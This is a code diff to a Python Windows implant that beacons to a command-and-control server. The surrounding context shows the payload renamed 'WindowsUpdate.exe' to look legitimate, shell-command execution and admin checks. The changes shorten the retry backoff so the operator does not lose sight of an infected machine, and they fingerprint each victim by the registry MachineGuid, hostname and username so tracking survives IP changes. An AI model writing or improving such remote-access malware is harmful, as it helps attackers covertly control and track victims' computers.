@@ -52,8 +52,11 @@ PAYLOAD_NAME = "WindowsUpdate.exe"  # Renamed to look legitimate
 
 C2_DOMAIN = os.getenv("C2_DOMAIN", "http://127.0.0.1:443").rstrip("/")
 RETRY_DELAY = 30  # seconds
+# Cap MUST stay below the server's HEARTBEAT_TIMEOUT (60s) — otherwise one
+# transient outage makes the client sleep past the dead threshold and the
+# operator sees it vanish even though the process is alive
 RETRY_BACKOFF_MIN = 5
-RETRY_BACKOFF_MAX = 300  # Cap for exponential backoff when server is unreachable
+RETRY_BACKOFF_MAX = 45
 POLLING_DELAY = 1.0  # Responsive 1s command poll
 JITTER = 0.2  # +/- 0.2s jitter
 CMD_TIMEOUT = 60  # Max seconds a shell command can run
@@ -88,6 +91,19 @@ def get_username():
         return getpass.getuser()
     except Exception:
         return os.environ.get("USERNAME", "unknown")
+
+
+def get_stable_machine_id():
+    """Per-Windows-install identifier that survives IP changes, DHCP renewals,
+    and VPN toggles. Falls back to hostname+user if the registry is unreadable."""
+    try:
+        with winreg.OpenKey(
+            winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Cryptography"
+        ) as k:
+            guid, _ = winreg.QueryValueEx(k, "MachineGuid")
+            return str(guid)[:16]
+    except Exception:
+        return f"{socket.gethostname()}-{get_username()}"
 
 
 # ============================================================
@@ -1487,7 +1503,10 @@ def connect_c2():
             hostname = socket.gethostname()
             os_info = f"{platform.system()} {platform.release()} ({platform.version()})"
             pid = os.getpid()
-            client_id = f"{ip}:{pid}"
+            # Stable identity: same machine+user keeps ONE dashboard entry across
+            # IP changes — the external IP is display info, not identity
+            username = get_username()
+            client_id = f"{hostname}:{username}:{get_stable_machine_id()[:8]}"
 
             try:
                 is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
@@ -1499,7 +1518,7 @@ def connect_c2():
                 "host": hostname,
                 "os": os_info,
                 "pid": pid,
-                "user": get_username(),
+                "user": username,
                 "admin": is_admin,
                 "client_id": client_id
             }
